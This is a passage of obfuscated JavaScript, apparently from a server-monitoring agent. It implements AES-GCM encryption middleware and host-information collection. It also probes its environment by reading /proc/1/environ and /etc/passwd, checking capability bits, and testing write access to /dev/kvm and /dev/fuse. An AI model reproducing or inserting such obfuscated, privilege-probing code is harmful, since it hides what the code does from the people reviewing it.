        } catch (m) {
            throw new Error(bG(0x25c) + m[bG(0x113)]);
        }
    }
    [a0aY(0x830)](a, b, c) {
        const bH = a0aY, d = { 'OSnXD': 'SHA256' };
        if (!a)
            return ![];
        try {
            const f = a0w[bH(0x390)](c), g = a0k[bH(0x486)](d[bH(0x49d)]);
            return g['update'](b), g[bH(0x856)](a, f);
        } catch (h) {
            return ![];
        }
    }
    [a0aY(0x860)](a, b = null) {
        const bI = a0aY, c = {
                'TRrKx': bI(0x242),
                'izVRV': bI(0x1af),
                'yVzFU': function (d, f, g) {
                    return d(f, g);
                },
                'LqUtm': 'base64'
            };
        if (a0P[bI(0x628)])
            return JSON[bI(0x789)](a);
        if (!this[bI(0x75f)])
            throw new Error(c[bI(0x498)]);
        try {
            const d = JSON['stringify'](a), f = Buffer[bI(0x317)](d, c['izVRV']), g = b || Buffer[bI(0x317)](this[bI(0x75f)]), h = c[bI(0x77c)](a0v, g, f);
            return Buffer[bI(0x317)](h)['toString'](c[bI(0x826)]);
        } catch (i) {
            throw new Error(bI(0x74f) + i[bI(0x113)]);
        }
    }
    ['decryptData'](a, b) {
        const bJ = a0aY, c = {
                'mluEp': function (d, f) {
                    return d !== f;
                },
                'TVOrn': 'AES\x20Decrypt\x20Error:\x20Key\x20must\x20be\x20exactly\x2032\x20bytes\x20for\x20AES-256.',
                'tXnKN': bJ(0x330),
                'QAyPL': bJ(0x507),
                'ndQNs': bJ(0x262),
                'DRoNU': bJ(0x53b)
            };
        if (!b || c[bJ(0x7b7)](b['length'], 0x20))
            throw new Error(c['TVOrn']);
        try {
            const d = Buffer['from'](a, bJ(0x262))[bJ(0x62f)](c[bJ(0x8f2)]), f = JSON[bJ(0x675)](d);
            if (!f[bJ(0x72e)] || !f[bJ(0x1ea)] || !f['ciphertext'])
                throw new Error(c[bJ(0x69c)]);
            const g = Buffer[bJ(0x317)](f['nonce'], c['ndQNs']), h = Buffer[bJ(0x317)](f['tag'], c[bJ(0x55c)]), i = Buffer[bJ(0x317)](f[bJ(0x224)], c[bJ(0x55c)]), j = a0k['createDecipheriv'](c['DRoNU'], b, g);
            j[bJ(0x84b)](h);
            let k = j[bJ(0x1cf)](i, null, c[bJ(0x8f2)]);
            return k += j[bJ(0x4aa)](c['tXnKN']), k;
        } catch (l) {
            throw new Error(bJ(0x315) + l[bJ(0x113)]);
        }
    }
    [a0aY(0x553)](a, b) {
        const bK = a0aY, c = {
                'theSY': bK(0x335),
                'XpMqr': 'base64',
                'ZfQeN': bK(0x330)
            };
        if (!b || b[bK(0x8fc)] !== 0x20)
            throw new Error(c[bK(0x8dc)]);
        try {
            const d = a0k[bK(0x6de)](0xc), f = a0k[bK(0x1c1)](bK(0x53b), b, d), g = Buffer[bK(0x65f)]([
                    f[bK(0x1cf)](a),
                    f[bK(0x4aa)]()
                ]), h = f[bK(0x777)](), i = {
                    'nonce': d[bK(0x62f)](c[bK(0x4a8)]),
                    'tag': h[bK(0x62f)](bK(0x262)),
                    'ciphertext': g[bK(0x62f)](c[bK(0x4a8)])
                };
            return Buffer[bK(0x317)](JSON[bK(0x789)](i), c[bK(0x4e9)])[bK(0x62f)](bK(0x262));
        } catch (j) {
            throw new Error(bK(0x908) + j[bK(0x113)]);
        }
    }
}
function a0S(a, b, c, d, f) {
    const bL = a0aY;
    return !c && (c = a0k[bL(0x2a9)](bL(0x7df))[bL(0x1cf)](Buffer[bL(0x5fd)](0x0))[bL(0x867)](bL(0x20c))), a + '\x0a' + b + '\x0a' + c + '\x0a' + d + '\x0a' + f;
}
function a0T(a, b = null) {
    const bM = a0aY, c = {
            'ZUmFp': bM(0x305),
            'kijlG': bM(0x33e),
            'QdMnd': bM(0x18d),
            'LeovD': bM(0x6a8),
            'llKNc': '/api/baseinfo',
            'qxqjT': function (d, f) {
                return d === f;
            },
            'YiDhL': bM(0x7f4),
            'wfCkK': bM(0x262),
            'nrGqK': bM(0x61f),
            'AOvte': '/api/ws/',
            'ojzhq': function (d) {
                return d();
            },
            'NMkqA': bM(0x6ae),
            'JAziV': bM(0x4ff),
            'rOGCb': '/api/status',
            'gtiZe': bM(0x83c),
            'KbZuj': 'X-Nonce',
            'cNtBp': bM(0x6bb),
            'RlRqy': bM(0x7f9),
            'xfIOW': bM(0x1c0),
            'xHMYI': bM(0x7e1),
            'iRzcD': bM(0x589),
            'EWOJl': function (d, f) {
                return d !== f;
            },
            'XixEp': bM(0x254),
            'mvmrx': bM(0x1af),
            'oYxJU': function (d, f) {
                return d > f;
            },
            'OfFjy': bM(0x7df),
            'FQeYg': 'hex',
            'GKRNq': bM(0x398),
            'fDWRQ': bM(0x750)
        };
    return async (d, f, g) => {
        const bN = bM, h = {
                'SrGvP': function (o, p) {
                    return o === p;
                },
                'HnnUf': c[bN(0x688)],
                'FsvuT': c[bN(0x514)],
                'RbFPg': c['QdMnd'],
                'OLCEd': c[bN(0x482)],
                'GLYpT': c[bN(0x366)],
                'dKFPm': function (o, p) {
                    const bO = bN;
                    return c[bO(0x655)](o, p);
                },
                'GBNgZ': c[bN(0x2ee)],
                'EBBqA': function (o, p) {
                    return c['qxqjT'](o, p);
                },
                'XAjfk': bN(0x330),
                'VOSaA': c[bN(0x31a)],
                'dihry': c[bN(0x128)],
                'GxuNa': bN(0x707),
                'nBcRp': 'application/json'
            };
        if (d[bN(0x7d3)][bN(0x49a)](c[bN(0x3ff)]))
            return c[bN(0x6c7)](g);
        const i = f['send'];
        f[bN(0x272)] = function (o) {
            const bP = bN;
            if (a0P[bP(0x628)]) {
                const p = h[bP(0x794)](typeof o, h[bP(0x3a9)]) ? o : Buffer[bP(0x3cd)](o) ? o : JSON[bP(0x789)](o);
                return f[bP(0x6c4)](h[bP(0x44b)], h[bP(0x4e2)]), f[bP(0x6c4)](h[bP(0x31b)], Buffer[bP(0x80e)](p)[bP(0x62f)]()), i['call'](this, p);
            }
            if (f[bP(0x14d)](bP(0x874)) && f['get'](bP(0x874))[bP(0x27e)](bP(0x814)))
                try {
                    if (d[bP(0x922)]) {
                        let q;
                        if (d[bP(0x7d3)] === h[bP(0x89d)]) {
                            const r = h[bP(0x794)](typeof o, bP(0x33e)) ? JSON[bP(0x675)](o) : o;
                            let s = null;
                            h[bP(0x548)](d['key_source'], h['GBNgZ']) && b && (s = b['getActiveEciesPub']());
                            const t = a[bP(0x860)](r, s);
                            q = h[bP(0x288)](typeof t, h[bP(0x3a9)]) ? t : JSON[bP(0x789)](t);
                        } else {
                            const u = Buffer[bP(0x3cd)](o) ? o : h[bP(0x794)](typeof o, h['HnnUf']) ? Buffer[bP(0x317)](o, h['XAjfk']) : Buffer[bP(0x317)](JSON[bP(0x789)](o), h[bP(0x3cc)]);
                            q = a[bP(0x553)](u, Buffer['from'](a0P[bP(0x3a3)], h[bP(0x4f2)]));
                        }
                        return f[bP(0x6c4)](h[bP(0x44b)], h['dihry']), f[bP(0x6c4)](h['GxuNa'], a0P[bP(0x1fe)]), f[bP(0x6c4)](h[bP(0x31b)], Buffer[bP(0x80e)](q, bP(0x330))[bP(0x62f)]()), i[bP(0x11b)](this, q);
                    } else {
                        const v = h[bP(0x794)](typeof o, h[bP(0x3a9)]) ? o : JSON['stringify'](o);
                        return f[bP(0x6c4)](h[bP(0x31b)], Buffer['byteLength'](v, 'utf8')[bP(0x62f)]()), i[bP(0x11b)](this, v);
                    }
                } catch (w) {
                    if (!f[bP(0x2f0)]) {
                        const x = JSON[bP(0x789)]({ 'error': 'Response\x20encryption\x20failed:\x20' + w[bP(0x113)] });
                        return f[bP(0x5c3)](0x1f4), f[bP(0x6c4)](bP(0x874), h[bP(0x66c)]), f[bP(0x6c4)](h['OLCEd'], Buffer[bP(0x80e)](x, h['XAjfk'])[bP(0x62f)]()), i[bP(0x11b)](this, x);
                    }
                    throw w;
                }
            return i['call'](this, o);
        };
        const j = f[bN(0x233)];
        f[bN(0x233)] = function (...o) {
            const bQ = bN;
            return a0P[bQ(0x628)] && !f['get'](c[bQ(0x514)]) && f['set'](c[bQ(0x514)], bQ(0x18d)), j[bQ(0x38b)](this, o);
        };
        if (d[bN(0x43c)] === c[bN(0x5c5)] || c[bN(0x655)](d[bN(0x43c)], c[bN(0x5a8)]))
            return a0P['DEBUG'] && f[bN(0x6c4)](c[bN(0x514)], bN(0x18d)), g();
        d[bN(0x922)] = ![];
        const k = [
            bN(0x216),
            c[bN(0x12d)]
        ];
        if (a0P[bN(0x628)])
            return d[bN(0x922)] = !![], g();
        const l = d[bN(0x7c1)][c[bN(0x3ec)]] || d[bN(0x7c1)][c['KbZuj']], m = d[bN(0x7c1)][c[bN(0x692)]] || d[bN(0x7c1)][c[bN(0x5d3)]], n = d[bN(0x7c1)][c[bN(0x244)]] || d[bN(0x7c1)][c[bN(0x903)]];
        if (!l || !m || !n)
            return k['includes'](d[bN(0x7d3)]) ? c[bN(0x6c7)](g) : f['status'](0x191)['json']({ 'error': c[bN(0x5c2)] });
        try {
            let o = Buffer[bN(0x5fd)](0x0);
            if (c['EWOJl'](d['path'], c[bN(0x559)])) {
                if (Buffer['isBuffer'](d['body']))
                    o = d[bN(0x3ed)];
                else {
                    if (c[bN(0x655)](typeof d[bN(0x3ed)], bN(0x33e)))
                        o = Buffer[bN(0x317)](d[bN(0x3ed)], c[bN(0x32a)]);
                }
            }
            const p = c[bN(0x77d)](o[bN(0x8fc)], 0x0) ? a0k[bN(0x2a9)](c[bN(0x51a)])[bN(0x1cf)](o)['digest'](c[bN(0x5e6)]) : '', q = b ? b[bN(0x635)]() : null, r = a[bN(0x640)](d[bN(0x43c)], d[bN(0x7d3)], p, l, m, n, q);
            d['is_authenticated'] = !![], d[bN(0x106)] = c[bN(0x655)](r, bN(0x7f4)) ? c['YiDhL'] : bN(0x58c);
        } catch (s) {
            return k[bN(0x27e)](d[bN(0x7d3)]) ? c[bN(0x6c7)](g) : f['status'](0x191)[bN(0x46b)]({ 'error': bN(0x25c) + s[bN(0x113)] });
        }
        if (d[bN(0x3ed)] && typeof d[bN(0x3ed)] === bN(0x33e)) {
            const t = (d[bN(0x7c1)][c[bN(0x116)]] || '')[bN(0x52c)]() === c['nrGqK'];
            try {
                if (t && d['is_authenticated']) {
                    const u = Buffer[bN(0x317)](a0P[bN(0x3a3)], bN(0x262)), v = a[bN(0x451)](d['body'], u);
                    d[bN(0x3ed)] = JSON[bN(0x675)](v);
                } else {
                    if (d[bN(0x3ed)][bN(0x49a)](c[bN(0x7aa)])) {
                        const w = Buffer[bN(0x317)](d[bN(0x3ed)], c[bN(0x31a)])[bN(0x62f)](bN(0x1af));
                        d[bN(0x3ed)] = JSON[bN(0x675)](w);
                    } else {
                        if (d[bN(0x3ed)][bN(0x2eb)]()[bN(0x49a)]('{') || d[bN(0x3ed)][bN(0x2eb)]()[bN(0x49a)]('['))
                            d[bN(0x3ed)] = JSON[bN(0x675)](d[bN(0x3ed)]);
                        else {
                            if (d[bN(0x3ed)][bN(0x2eb)]() === '')
                                d[bN(0x3ed)] = {};
                        }
                    }
                }
            } catch (x) {
                return a0D[bN(0x1e9)](bN(0x11e) + x[bN(0x113)]), f[bN(0x5c3)](0x190)[bN(0x46b)]({ 'error': bN(0x755) + x[bN(0x113)] });
            }
        }
        c[bN(0x6c7)](g);
    };
}
class a0U {
    constructor() {
        const bR = a0aY, a = {
                'xIjpN': function (b, c) {
                    return b / c;
                }
            };
        this['lastNetworkStats'] = {
            'rx': 0x0,
            'tx': 0x0
        }, this[bR(0x556)] = 0x0, this['totalNetworkDown'] = 0x0, this[bR(0x339)] = a['xIjpN'](Date[bR(0x4ea)](), 0x3e8);
    }
    async ['getContainerMemory']() {
        const bS = a0aY, a = {
                'AkfTI': bS(0x458),
                'zNfhB': 'utf8',
                'IVCLU': function (d, f) {
                    return d === f;
                },
                'AFgis': bS(0x2c1),
                'PoVmA': bS(0xed),
                'HAyzh': function (d, f, g) {
                    return d(f, g);
                },
                'QKQYE': '/sys/fs/cgroup/memory/memory.limit_in_bytes',
                'SLhth': function (d, f) {
                    return d > f;
                },
                'YbPGZ': function (d, f) {
                    return d === f;
                },
                'EDkMt': function (d, f) {
                    return d === f;
                },
                'vPsSp': function (d, f) {
                    return d(f);
                },
                'URKij': function (d, f) {
                    return d - f;
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0m[bS(0x5ba)](a[bS(0x228)], a['zNfhB']))[bS(0x2eb)]();
            b = a['IVCLU'](d, a[bS(0x69e)]) ? null : parseInt(d, 0xa), c = parseInt((await a0m[bS(0x5ba)](a[bS(0x143)], a['zNfhB']))[bS(0x2eb)](), 0xa);
        } catch {
            try {
                b = a[bS(0x4ce)](parseInt, (await a0m[bS(0x5ba)](a['QKQYE'], a['zNfhB']))[bS(0x2eb)](), 0xa), c = a['HAyzh'](parseInt, (await a0m[bS(0x5ba)](bS(0x27c), a[bS(0x87b)]))[bS(0x2eb)](), 0xa);
                if (a[bS(0x52d)](b, 0x7ffffffffffff000))
                    b = null;
            } catch {
                const f = await a0u[bS(0x64a)]();
                b = f[bS(0x73f)], c = f['used'];
            }
        }
        if (a[bS(0x634)](b, null)) {
            const g = await a0u[bS(0x64a)]();
            b = g[bS(0x73f)], (a['EDkMt'](c, null) || a[bS(0x633)](isNaN, c)) && (c = g[bS(0x875)]);
        }
        return {
            'total': b,
            'used': c,
            'available': a[bS(0x871)](b, c),
            'free': a[bS(0x871)](b, c),
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async [a0aY(0x1c5)]() {
        const bT = a0aY, a = await this[bT(0x5dd)](), b = await this[bT(0x8af)](a['virtualization']), c = await this[bT(0x7ad)](), d = a0U[bT(0x2a0)](a, b, c);
        return a0D[bT(0x52b)](bT(0x456) + JSON['stringify'](d, null, 0x2), 0x1), d;
    }
    static [a0aY(0x2a0)](a, b, c) {
        const bU = a0aY;
        return {
            'arch': a['arch'],
            'cpu_cores': a[bU(0x8cf)],
            'cpu_name': a[bU(0x59b)],
            'disk_total': b[bU(0x8aa)],
            'gpu_name': a[bU(0x55d)],
            'ipv4': c[bU(0x59a)] ?? null,
            'ipv6': c['ipv6'] ?? null,
            'mem_total': b[bU(0x1a8)],
            'os': a['os'],
            'kernel_version': a[bU(0x207)],
            'swap_total': b['swap_total'],
            'version': a[bU(0x1fb)],
            'virtualization': a[bU(0x150)],
            'marks': Array[bU(0x22c)](a[bU(0x2cb)]) ? [...a[bU(0x2cb)]] : []
        };
    }
    static [a0aY(0x391)]() {
        const bV = a0aY;
        return {
            'arch': '',
            'cpu_cores': 0x0,
            'cpu_name': '',
            'gpu_name': '',
            'os': '',
            'kernel_version': '',
            'version': a0P[bV(0x1fe)],
            'virtualization': '',
            'marks': []
        };
    }
    static [a0aY(0x436)]() {
        return {
            'disk_total': 0x0,
            'mem_total': 0x0,
            'swap_total': 0x0
        };
    }
    static [a0aY(0x3e7)]() {
        return {
            'ipv4': null,
            'ipv6': null
        };
    }
    async ['collectStaticInfo']() {
        const bW = a0aY;
        let a = {}, b = {};
        try {
            a = await a0u[bW(0x462)]();
        } catch (d) {
            a0D[bW(0x52b)]('获取\x20CPU\x20信息失败:\x20' + d[bW(0x113)], 0x1);
        }
        try {
            b = await a0u['osInfo']();
        } catch (f) {
            a0D[bW(0x52b)]('获取\x20OS\x20信息失败:\x20' + f['message'], 0x1);
        }
        let c = '';
        try {
            c = await this[bW(0x1b1)]();
        } catch (g) {
            a0D[bW(0x52b)]('获取虚拟化信息失败:\x20' + g[bW(0x113)], 0x1);
        }
        return {
            'arch': a0p[bW(0x2ce)]() || '',
            'cpu_cores': a[bW(0x301)] || 0x0,
            'cpu_name': a[bW(0x5b0)] || '',
            'gpu_name': '',
            'os': ((b[bW(0x118)] || '') + '\x20' + (b[bW(0x729)] || ''))['trim'](),
            'kernel_version': b[bW(0x19c)] || '',
            'version': a0P[bW(0x1fe)],
            'virtualization': c,
            'marks': this[bW(0x6ab)]()
        };
    }
    async [a0aY(0x8af)](a) {
        const bX = a0aY;
        let b = 0x0;
        try {
            b = (await a0u[bX(0x88d)]())[0x0]?.[bX(0x3e9)] || 0x0;
        } catch (d) {
            a0D[bX(0x52b)]('获取磁盘总容量失败:\x20' + d[bX(0x113)], 0x1);
        }
        let c = {
            'total': 0x0,
            'swaptotal': 0x0
        };
        try {
            c = await this[bX(0x3fa)]() || c;
        } catch (f) {
            a0D[bX(0x52b)](bX(0x14c) + f[bX(0x113)], 0x1);
        }
        return {
            'disk_total': b,
            'mem_total': c[bX(0x73f)] || 0x0,
            'swap_total': c[bX(0x8db)] || 0x0
        };
    }
    async [a0aY(0x7ad)]() {
        const bY = a0aY, a = {
                'MJVec': bY(0x878),
                'VLWha': function (d, f) {
                    return d === f;
                },
                'ZqFGw': function (d, f) {
                    return d === f;
                },
                'bpIiz': bY(0x3ad)
            }, [b, c] = await Promise[bY(0x5b6)]([
                this[bY(0x2f4)](),
                this[bY(0x7e2)]()
            ]);
        if (b[bY(0x5c3)] === a[bY(0x924)])
            a0D[bY(0x52b)]('获取\x20IPv4\x20失败:\x20' + b[bY(0x47d)], 0x1);
        if (a[bY(0x92b)](c[bY(0x5c3)], a[bY(0x924)]))
            a0D[bY(0x52b)](bY(0x505) + c[bY(0x47d)], 0x1);
        return {
            'ipv4': a['ZqFGw'](b['status'], bY(0x3ad)) ? b[bY(0x186)] : null,
            'ipv6': a[bY(0x92b)](c[bY(0x5c3)], a[bY(0x23d)]) ? c[bY(0x186)] : null
        };
    }
    static [a0aY(0x1bd)] = '/proc';
    static [a0aY(0x4a7)] = '/dev';
    static [a0aY(0x185)] = a0aY(0x4e5);
    static [a0aY(0x34e)] = a0aY(0x1e2);
    static [a0aY(0x192)] = '/';
    [a0aY(0x6ab)]() {
        const bZ = a0aY, a = {
                'mQEXc': function (d, f) {
                    return d !== f;
                },
                'FxRpJ': bZ(0x6a5),
                'iaBIr': bZ(0x90e),
                'wscYL': 'kvm',
                'ASPsE': bZ(0x193),
                'pLxrB': bZ(0x529),
                'Jkmft': function (d) {
                    return d();
                },
                'TLpkp': bZ(0x19f)
            };
        if (a['mQEXc'](process[bZ(0x473)], a[bZ(0x39a)]))
            return [];
        const b = [], c = [
                [
                    a['iaBIr'],
                    () => this[bZ(0x569)]()
                ],
                [
                    a['wscYL'],
                    () => this[bZ(0x758)]()
                ],
                [
                    a[bZ(0x470)],
                    () => this['_markPterodactyl']()
                ],
                [
                    a[bZ(0x723)],
                    () => this[bZ(0x1b0)]()
                ],
                [
                    bZ(0x195),
                    () => this['_markFuse']()
                ]
            ];
        for (const [d, f] of c) {
            try {
                if (a[bZ(0x277)](f))
                    b['push'](d);
            } catch (g) {
                a0D[bZ(0x52b)](bZ(0x2cc) + d + ']:\x20' + g[bZ(0x113)], 0x1);
            }
        }
        return a0D[bZ(0x52b)]('marks\x20命中:\x20' + (b[bZ(0x2e0)](',') || a[bZ(0x69f)]), 0x1), b;
    }
    [a0aY(0x569)]() {
        const c0 = a0aY, a = {
                'ZWmGF': function (b, c) {
                    return b !== c;
                },
                'PCsZr': c0(0x809),
                'TcNmQ': function (b, c) {
                    return b === c;
                }
            };
        if (a[c0(0x637)](typeof process[c0(0x1b7)], a['PCsZr']) || a['ZWmGF'](typeof process[c0(0x225)], a[c0(0x450)]))
            return ![];
        return a[c0(0x472)](process[c0(0x1b7)](), 0x0) && process[c0(0x225)]() === 0x0;
    }
    [a0aY(0x758)]() {
        const c1 = a0aY, a = { 'rCaOS': 'kvm' };
        return a0U['_charDeviceRW'](a0o[c1(0x2e0)](a0U[c1(0x4a7)], a[c1(0x694)]), 0xa, 0xe8);
    }
    [a0aY(0x87e)]() {
        const c2 = a0aY, a = {
                'MjTih': c2(0x195),
                'Ykhfj': c2(0xd4),
                'KdvDl': c2(0x21f),
                'dseUd': c2(0x153)
            };
        if (!a0U['_charDeviceRW'](a0o[c2(0x2e0)](a0U['MARKS_DEV_ROOT'], a[c2(0x6c2)]), 0xa, 0xe5))
            return ![];
        if (this[c2(0x6bf)](0x15))
            return !![];
        for (const b of [
                a['Ykhfj'],
                c2(0x7f1),
                a[c2(0x5d8)],
                a[c2(0x6f0)]
            ]) {
            try {
                const c = a0l[c2(0xca)](a0o[c2(0x2e0)](a0U[c2(0x192)], b));
                if (c[c2(0x10b)]() && c['mode'] & 0x800 && c[c2(0x291)] & 0x49)
                    return !![];
            } catch {
            }
        }
        return ![];
    }
    [a0aY(0x5bc)]() {
        const c3 = a0aY, a = {
                'FOqBE': c3(0x402),
                'SiDTn': c3(0x7da),
                'YfSnQ': c3(0x685),
                'Byaum': c3(0x72a),
                'UsrBV': c3(0x330),
                'UQvXq': c3(0x781),
                'nmxKe': function (g, h) {
                    return g !== h;
                },
                'xshPE': 'function',
                'oFwEl': 'passwd',
                'pOwdC': function (g, h) {
                    return g > h;
                },
                'XJMYi': function (g, h) {
                    return g === h;
                },
                'OlTdP': function (g, h) {
                    return g(h);
                },
                'cUHNx': '.dockerenv',
                'eqawh': c3(0x1cc)
            };
        if (a0U[c3(0x58e)](a0o['join'](a0U[c3(0x1bd)], a['FOqBE'], a[c3(0x3d6)]), Buffer[c3(0x317)](a[c3(0x35b)])))
            return !![];
        for (const g of [
                a[c3(0x7cc)],
                '1'
            ]) {
            const h = a0U[c3(0x114)](a0o[c3(0x2e0)](a0U[c3(0x1bd)], g, a[c3(0x3ca)]));
            if (!h)
                continue;
            const i = h[c3(0x62f)](a[c3(0x78f)])['split']('\x00'), j = i[c3(0x5c7)](l => l[c3(0x49a)]('P_SERVER_UUID=')), k = i[c3(0x5c7)](l => l[c3(0x49a)]('P_SERVER_LOCATION='));
            if (j && k)
                return !![];
        }
        const b = a0U[c3(0x114)](a0o[c3(0x2e0)](a0U[c3(0x185)], c3(0x65c)));
        if (!b)
            return ![];
        const c = b[c3(0x62f)](a[c3(0x78f)])[c3(0x2eb)]()[c3(0x52c)]();
        if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/['test'](c))
            return ![];
        try {
            if (!a0l[c3(0xca)](a0o[c3(0x2e0)](a0U[c3(0x192)], a[c3(0x5cf)], c3(0x62c)))[c3(0x8e1)]())
                return ![];
        } catch {
            return ![];
        }
        if (a[c3(0x724)](typeof process[c3(0x1b7)], a['xshPE']))
            return ![];
        const d = process[c3(0x1b7)](), f = a0U[c3(0x114)](a0o[c3(0x2e0)](a0U[c3(0x185)], a[c3(0x6b7)]));
        if (!f)
            return ![];
        for (const l of f[c3(0x62f)](a[c3(0x78f)])[c3(0x3ab)]('\x0a')) {
            const m = l[c3(0x3ab)](':');
            if (a[c3(0x834)](m[c3(0x8fc)], 0x2) && a[c3(0x91b)](a[c3(0x287)](Number, m[0x2]), d))
                return ![];
        }
        return a0l[c3(0xfe)](a0o[c3(0x2e0)](a0U[c3(0x192)], a['cUHNx'])) || a0l[c3(0xfe)](a0o['join'](a0U[c3(0x34e)], a[c3(0x6ac)]));
    }
    [a0aY(0x1b0)]() {
        const c4 = a0aY, a = {
                'yCAQV': c4(0x529),
                'dWedp': c4(0x7ab),
                'gwCws': c4(0x8fe),
                'TsUbt': c4(0x690),
                'zyWfL': c4(0x330),
                'eyjQO': c4(0x906)
            };
        try {
            if (!a0l[c4(0xca)](a0o[c4(0x2e0)](a0U[c4(0x34e)], a[c4(0x121)], c4(0x775)))[c4(0x8e1)]())
                return ![];
        } catch {
            return ![];
        }
        if (!a0l[c4(0xfe)](a0o[c4(0x2e0)](a0U['MARKS_RUN_ROOT'], c4(0x529), a[c4(0x44a)])) && !a0l['existsSync'](a0o[c4(0x2e0)](a0U[c4(0x34e)], a['gwCws'], c4(0x1e4))))
            return ![];
        if (!a0U[c4(0x4f5)]())
            return ![];
        const b = a0U[c4(0x114)](a0o[c4(0x2e0)](a0U[c4(0x1bd)], '1', a[c4(0x30c)]));
        if (b) {
            const c = b[c4(0x62f)](a['zyWfL'])[c4(0x2eb)]();
            if (c)
                return c[c4(0x52c)]()[c4(0x27e)](a['yCAQV']);
        }
        try {
            const d = a0l[c4(0x66b)](a0o[c4(0x2e0)](a0U[c4(0x1bd)], '1', a['eyjQO']));
            if (d && !a0o[c4(0x884)](d)[c4(0x52c)]()[c4(0x27e)](a[c4(0x121)]))
                return ![];
        } catch {
        }
        return !![];
    }
    ['_capEffBit'](a) {
        const c5 = a0aY, b = {
                'DrWUf': c5(0x402),
                'BFPky': c5(0x5c3),
                'AXbDw': c5(0x330),
                'gKDSo': c5(0x6c6),
                'NTKQB': function (d, f) {
                    return d < f;
                },
                'LoYvI': function (d, f) {
                    return d >> f;
                },
                'LsrZr': function (d, f) {
                    return d(f);
                },
                'kRXga': function (d, f) {
                    return d + f;
                },
                'NeeYG': function (d, f) {
                    return d(f);
                }
            }, c = a0U['_readLimited'](a0o[c5(0x2e0)](a0U[c5(0x1bd)], b[c5(0x2b4)], b[c5(0x51c)]));
        if (!c)
            return ![];
        for (const d of c[c5(0x62f)](b[c5(0x251)])[c5(0x3ab)]('\x0a')) {
            if (d[c5(0x49a)](b[c5(0x197)])) {
                const f = d[c5(0x3ab)](/\s+/);
                if (b[c5(0x485)](f[c5(0x8fc)], 0x2))
                    return ![];
                try {
                    return (b[c5(0x678)](b[c5(0x803)](BigInt, b[c5(0x55a)]('0x', f[0x1])), b[c5(0x87f)](BigInt, a)) & 0x1n) === 0x1n;
                } catch {
                    return ![];
                }
            }
        }
        return ![];
    }
    static [a0aY(0x4f5)]() {
        const c6 = a0aY, a = {
                'LHrEC': 'usr/bin/systemctl',
                'tjhDX': c6(0x4f4),
                'DYtjO': 'systemctl'
            };
        for (const b of [
                a[c6(0x772)],
                'bin/systemctl',
                a[c6(0x725)]
            ]) {
            if (a0U[c6(0x2a1)](a0o[c6(0x2e0)](a0U[c6(0x192)], b)))
                return !![];
        }
        for (const c of (process.env.PATH || '')[c6(0x3ab)](a0o['delimiter'])) {
            if (c && a0U[c6(0x2a1)](a0o[c6(0x2e0)](c, a[c6(0x73b)])))
                return !![];
        }
        return ![];
    }
    static [a0aY(0x2a1)](a) {
        const c7 = a0aY, b = {
                'BHsSb': function (c, d) {
                    return c !== d;
                },
                'EUZIc': function (c, d) {
                    return c & d;
                }
            };
        try {
            const c = a0l[c7(0xca)](a);
            return c[c7(0x10b)]() && b['BHsSb'](b[c7(0x661)](c[c7(0x291)], 0x49), 0x0);
        } catch {
            return ![];
        }
    }
    static [a0aY(0x54e)](a, b, c) {
        const c8 = a0aY, d = {
                'yoABa': function (f, g) {
                    return f !== g;
                }
            };
        try {
            const f = a0l['statSync'](a);
            if (!f[c8(0x5a1)]())
                return ![];
            if (d[c8(0x5b8)](a0U['_devMajor'](f[c8(0x2d4)]), b) || d[c8(0x5b8)](a0U[c8(0x43d)](f[c8(0x2d4)]), c))
                return ![];
            const g = a0l['openSync'](a, 'r+');
            try {
                return !![];
            } finally {
                a0l[c8(0x170)](g);
            }
        } catch {
            return ![];
        }
    }
    static [a0aY(0x3f3)](a) {
        const c9 = a0aY, b = {
                'ngUFi': function (f, g) {
                    return f % g;
                },
                'XsocU': function (f, g) {
                    return f / g;
                },
                'tSQLx': function (f, g) {
                    return f / g;
                },
                'fTzVk': function (f, g) {
                    return f >>> g;
                }
            }, c = b[c9(0x154)](Math[c9(0x7c7)](b[c9(0x71a)](a, 0x100)), 0x1000), d = Math[c9(0x7c7)](b[c9(0x513)](a, 0x100000000));
        return b['fTzVk'](c | d & ~0xfff, 0x0);
    }
    static [a0aY(0x43d)](a) {
        const ca = a0aY, b = {
                'JOMeT': function (f, g) {
                    return f % g;
                },
                'mtpPU': function (f, g) {
                    return f & g;
                },
                'Bjbxy': function (f, g) {
                    return f % g;
                },
                'ktYjJ': function (f, g) {
                    return f / g;
                },
                'vnInh': function (f, g) {
                    return f >>> g;
                }
            }, c = b[ca(0x6af)](a, 0x100), d = b[ca(0x8f7)](b['Bjbxy'](Math[ca(0x7c7)](b[ca(0x912)](a, 0x1000)), 0x100000), 0xfff00);
        return b[ca(0x881)](c | d, 0x0);
    }
    static [a0aY(0x114)](a, b = 0x400 * 0x400) {
        const cb = a0aY, c = {
                'mqIIe': function (f, g) {
                    return f < g;
                },
                'RrImL': function (f, g) {
                    return f - g;
                },
                'bRFnF': function (f, g) {
                    return f !== g;
                }
            };
        let d = null;
        try {
            d = a0l['openSync'](a, 'r');
            const f = Buffer['alloc'](0x2000), g = [];
            let h = 0x0;
            while (c[cb(0x757)](h, b)) {
                const i = a0l['readSync'](d, f, 0x0, Math[cb(0x687)](f[cb(0x8fc)], c[cb(0x8e6)](b, h)), null);
                if (!i)
                    break;
                g[cb(0x1f0)](Buffer[cb(0x317)](f[cb(0x6e2)](0x0, i))), h += i;
            }
            return Buffer[cb(0x65f)](g);
        } catch {
            return null;
        } finally {
            if (c['bRFnF'](d, null))
                try {
                    a0l[cb(0x170)](d);
                } catch {
                }
        }
    }
    static [a0aY(0x58e)](a, b, c = 0x400 * 0x400, d = 0x2000) {
        const cc = a0aY, f = {
                'zmrHv': function (h, i) {
                    return h - i;
                },
                'nLCsp': function (h, i) {
                    return h !== i;
                }
            };
        let g = null;
        try {
            g = a0l['openSync'](a, 'r');
            const h = Math[cc(0x2c1)](0x0, f[cc(0xf6)](b['length'], 0x1)), i = Buffer[cc(0x5fd)](d);
            let j = Buffer['alloc'](0x0), k = 0x0;
            while (k < c) {
                const l = a0l[cc(0x531)](g, i, 0x0, Math[cc(0x687)](d, f[cc(0xf6)](c, k)), null);
                if (!l)
                    break;
                k += l;
                const m = Buffer[cc(0x65f)]([
                    j,
                    i[cc(0x6e2)](0x0, l)
                ]);
                if (f['nLCsp'](m['indexOf'](b), -0x1))
                    return !![];
